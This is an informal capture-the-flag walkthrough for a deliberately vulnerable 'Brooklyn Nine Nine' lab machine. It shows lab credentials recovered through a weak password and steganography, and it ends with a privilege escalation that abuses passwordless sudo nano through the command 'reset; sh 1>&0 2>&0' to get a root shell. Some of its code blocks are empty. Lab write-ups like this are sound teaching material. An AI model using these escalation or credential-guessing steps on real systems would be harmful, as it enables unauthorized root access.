Haha a comedy classic. ok ftp first

```

```

haha `jake` got a weak password. No surprise here! does it mean we can brute his ssh?

hmm..let's check the website first...wide background...lets check code (always)

```

<p>This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.</p>

steganography is booming now...Do people really use it that much IRL?

time-consuming for probable results...my computer is a potato...oh look it's done!

in the extracted file we get holt-s password lol

```
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

Ok now I get it..the author was talkig about two ways of access

I thought we would be jake but we are holt...

I want to try something real quick (not so quick) 


```

Lol I knew it! now we hae two possible ways of access:

`jake:987654321`

`holt:fluffydog12@ninenine`

I like jake alot but I feel holt would have more "authority"...holt first!

We can always su to jake if the same password is valid

```
holt@brookly_nine_nine:~$ cat user.txt
brooklyn_nine_nine_flag
```

## Privilege Escalation

Even holt needs more privileges

```
holt@brookly_nine_nine:/home/amy$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

nano? easy!

like vi or vim nano can execute commands too

as it runs as root (sudo) just ask for a shell and it shall be a root shell

first open nano with root authority

`sudo nano`

Next do ^R (ctrl+R) for reading mode then ^X (ctrl+X) for commands execution

your command for a shell would be:
```
reset; sh 1>&0 2>&0
```
press enter and you are root

```
# id
uid=0(root) gid=0(root) groups=0(root)
```
Now go get that flag!

```
# cd /root
# ls
root.txt
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: nine_nine_hacked_flag

Enjoy!!
```
I hope you have fun doing this room...I specifically request it! XD
